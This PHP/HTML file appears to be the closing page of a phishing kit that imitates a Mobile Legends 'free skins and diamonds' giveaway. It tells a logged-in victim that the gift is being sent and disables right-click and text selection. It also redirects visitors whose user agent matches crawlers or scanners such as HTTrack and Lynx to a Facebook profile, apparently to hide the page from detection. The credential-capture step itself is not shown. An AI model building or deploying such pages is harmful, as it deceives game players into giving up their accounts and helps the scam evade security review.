<?php  
session_start();

$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.facebook.com/ilyas.pashati88');
die();
}

if(!isset($_SESSION['nickname'])) {
    header('location: /');
}
?>
<!doctype html>
<html lang="en">
    <head>
<meta charset="UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta property="og:title" content="Mobile Legends: Bang Bang" />

    <meta property="og:description" content="Get your favorite skins for free" />

    <meta property="og:image" content="https://i.ibb.co/C832Ykg/Capture.png" />

    <title>Mobile Legends</title>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css" integrity="sha512-rRQtF4V2wtAvXsou4iUAs2kXHi3Lj9NE7xJR77DE7GHsxgY9RTWy93dzMXgDIG8ToiRTD45VsDNdTiUagOFeZA==" crossorigin="anonymous" />

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>

    <link rel="stylesheet" href="static/css/imryu.css">

    <link rel="stylesheet" href="static/css/animate.css">

    <link rel="stylesheet" href="static/css/facebook.css">

    <link rel="stylesheet" href="static/css/twitter.css">

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">

    <link rel="shorcut icon" href="https://i.pinimg.com/originals/5f/3f/e8/5f3fe88ff2c07d4ebd0a85f64b272e05.jpg">

</head>

<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<iframe scrolling='no' allow='autoplay' src='static/sound.mp3' width='0' height='0' frameborder='no'></iframe>

    <div id="bg"></div>

    <div class="ryucodex">



        <div class="navbar">

            <img class="logoLeft" src="https://pht.qoo-static.com/VObo_efVQ255Uny-K5k6EEMxQ9PQYk6PFNSReWDQxKf19HiXBH8BbluIzH1e43iQiw=w512">

            <div class="text-left text-white text-header">

                 MOBILE LEGENDS<br>

                <span>FREE SKIN & DIAMONDS</span>

            </div>

            <img class="logoRight" src="static/img/logo.png" alt="">

        </div>

        <div class="ryu-banner">
            <div id="carouselExampleSlidesOnly" class="carousel slide" data-ride="carousel">
               <div class="carousel-inner">
                  <div class="carousel-item active">
<div style="position:relative;padding-bottom:56.25%;height:0;overflow:hidden;"> <iframe style="width:100%;height:100%;position:absolute;left:0px;top:0px;overflow:hidden" frameborder="0" type="text/html" src="https://www.youtube.com/embed/Jsylg_CBhls?controls=0&loop=1&autoplay=1&fs=1&iv_load_policy=3&showinfo=0&rel=0&cc_load_policy=0&start=0&end=0&origin=https://youtubeembedcode.com" width="100%" height="100%" allowfullscreen autoplay muted loop allow="autoplay" controls="0"> </iframe> </div>
                   
                  </div>

               </div>

            </div>

         </div>

            <div class="row mt-1 mb-1">
                <div class="col-md-12 col-12">
                    <div class="clearfix"></div>
                </div>
            </div>

            <div class="row mt-3">
                <div class="col-md-12 col-12">
                    <div class="app-subheader">
                        <img src="static/img/boxOn.png" alt="">
                    <span class="txt-sub" style="font-size: 17px; text-align: center;">Congratulations <?= $_SESSION['nickname'] ?>. Your gift is in the process of being sent, Thank you.</span>
                </div>
                <div class="form-group mt-4">
                           <button type="submit" class="btn btn-primary btn-custom" style="font-size: 13px;" onclick="location.href='./'">Logout</button>
                </div>
            </div>

            <div class="mb-3"></div>
        </div>
        </div>

        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
        <script src="static/js/imryu.js"></script>
    </body>
</html>